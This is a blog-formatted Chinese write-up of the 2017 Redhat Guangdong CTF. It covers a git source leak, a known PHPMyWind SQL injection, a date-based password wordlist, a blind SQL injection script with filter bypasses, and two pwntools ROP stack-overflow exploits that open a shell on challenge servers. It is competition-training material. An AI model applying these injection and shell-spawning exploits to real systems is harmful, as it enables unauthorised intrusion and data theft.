---
title: 2017 Redhat广东省信息安全竞赛 Writeup
tags: [write-up]
date: 2017-05-07 10:29
---
2017 Redhat广东省信息安全竞赛 Writeup
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="web">WEB</h1>
<h2 id="0x1-刮刮乐">0x1 刮刮乐</h2>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507100942803?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
通过文件扫描找到有文件泄露 <br>
利用Githack工具就可以把文件下下来 <br>
flag{027ea8c2-7be2-4cec-aca3-b6ba400759e8}</br></br></br></img></p>
<h2 id="0x2-phpmywind">0x2 PHPMyWIND</h2>
<p>这题是道综合性网站，可以查到现有的漏洞，一点都没有变 <br>
<a href="http://0day5.com/archives/1442/">原题</a> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507101214603?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
根据报错注入，显示的md5找到对应的值就是密码</br></img></br></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507101600544?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>访问其中的flag4ae482cda6e.txt即可得到flag</p>
<h2 id="0x3-后台">0x3 后台</h2>
<p>题目提示了有弱口令 <br>
首先生成字典</br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'1.txt'</span>,<span class="hljs-string">'w'</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">13</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-operator">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>):
        f.<span class="hljs-built_in">write</span>(<span class="hljs-string">'2017'</span>+<span class="hljs-string">'0'</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(str(i)))+str(i)+<span class="hljs-string">'0'</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(str(j)))+str(j)+<span class="hljs-string">'\n'</span>)</code></pre>
<p>利用burpsuit爆破</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170507102609034?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="0x4-thinkseeker">0x4  thinkseeker</h2>
<p>扫一下有index.php~源代码 <br>
1、用with rollup过前面两个if  <br>
2、用盲注找到flag  <br>
关于第一点在实验吧有原题：<a href="http://www.shiyanbar.com/ctf/1940">http://www.shiyanbar.com/ctf/1940</a> <br>
过滤方法稍有不同，用操作符代替关键字即可。token使用变量覆盖就可以。  <br>
第二点就是infoid这个参数有盲注，跑脚本可以拿到flag。  <br>
最后贴上注入脚本</br></br></br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs perl">import requests
string = <span class="hljs-string">''</span>
dic = <span class="hljs-string">"flag{}abcdef1234567890"</span>
<span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">40</span>):
    <span class="hljs-keyword">for</span> j in dic:
        url=<span class="hljs-string">"http://106.75.117.4:3083/?token=21232f297a57a5a743894a0e4a801fc3&amp;infoid=1<span class="hljs-variable">%0a</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><span class="hljs-variable">%0aascii</span>(substr((select<span class="hljs-variable">%0agroup_concat</span>(flag)<span class="hljs-variable">%0afrom</span><span class="hljs-variable">%0aflag</span>)from({})for(1)))={}&amp;userid=1<span class="hljs-variable">%0a</span>||<span class="hljs-variable">%0a1</span><span class="hljs-variable">%0agroup</span><span class="hljs-variable">%0aby</span><span class="hljs-variable">%0apassword</span><span class="hljs-variable">%0awith</span><span class="hljs-variable">%0arollup</span><span class="hljs-variable">%0alimit</span><span class="hljs-variable">%0a1</span><span class="hljs-variable">%0aoffset</span><span class="hljs-variable">%0a1</span>&amp;password="</span>.<span class="hljs-keyword">format</span>(i,<span class="hljs-keyword">ord</span>(j))
        <span class="hljs-keyword">s</span>=requests.get(url=url)
        content=<span class="hljs-keyword">s</span>.content
        <span class="hljs-keyword">if</span> <span class="hljs-string">"flag is in flag!"</span> in content:
            string+=j
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">print</span> string</code></pre>
<h1 id="pwn">PWN</h1>
<h2 id="pwn1">PWN1</h2>
<p>简单的栈溢出，通过构造rop执行system，直接写出脚本</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
pwn1 = ELF(<span class="hljs-string">'redhat/pwn1'</span>)
sh = remote(<span class="hljs-string">'106.75.93.221'</span>,  <span class="hljs-number">10000</span>)
padding = <span class="hljs-string">'A'</span>*(<span class="hljs-number">52</span>)<span class="hljs-comment">#长度爆出来的</span>
system_addr = p32(pwn1.plt[<span class="hljs-string">'system'</span>])
scanf_addr = p32(<span class="hljs-number">0x08048410</span>)
bss_addr = p32(<span class="hljs-number">0x0804A040</span>)
args = p32(<span class="hljs-number">0x08048629</span>)+ bss_addr
rop = p32(<span class="hljs-number">0x080485ee</span>)
sh.recvline()
payload = padding+scanf_addr+rop+args+system_addr+<span class="hljs-string">'a'</span>*<span class="hljs-number">4</span>+bss_addr
sh.sendline(payload)
sh.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)
sh.interactive()</code></pre>
<p>还有一种较为简单的方法，直接利用pwntools自带的工具</p>
<pre class="prettyprint"><code class=" hljs vbnet"><span class="hljs-keyword">from</span> pwn import *
<span class="hljs-preprocessor">#context.log_level = 'debug'</span>
<span class="hljs-keyword">binary</span> = ELF(<span class="hljs-comment">'./redhat/pwn1')</span>
p = remote(<span class="hljs-comment">'106.75.93.221',  10000)</span>
p.recvline()
rop = ROP(<span class="hljs-keyword">binary</span>)
rop.<span class="hljs-keyword">call</span>(<span class="hljs-number">0x08048410</span>,(<span class="hljs-number">0x08048629</span>, <span class="hljs-number">0x0804A040</span>))
rop.system(<span class="hljs-number">0x0804A040</span>)
payload = str(rop)
p.sendline(<span class="hljs-comment">'a'*52 + payload )</span>
p.sendline(<span class="hljs-comment">'/bin/sh')</span>
p.interactive()</code></pre></div>